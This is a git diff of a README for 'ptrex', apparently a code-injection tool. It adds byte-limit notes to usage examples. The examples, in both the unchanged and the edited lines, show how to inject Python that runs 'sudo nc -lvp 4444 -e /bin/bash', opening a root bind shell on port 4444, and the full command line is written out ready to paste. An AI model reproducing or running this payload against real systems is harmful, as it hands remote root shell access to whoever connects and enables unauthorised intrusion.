@@ -45,8 +45,8 @@ You can also inject your own python code:
 ./ptrex full_python_path newcmdline
 
 Example with 
-* own python binary: /home/dreg/tmp/python
-* bind bash shell python code: import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")
+* own python binary (limit 150 bytes): /home/dreg/tmp/python
+* bind bash shell python code (limit 250 bytes) : import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")
 ```
 ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
 ```
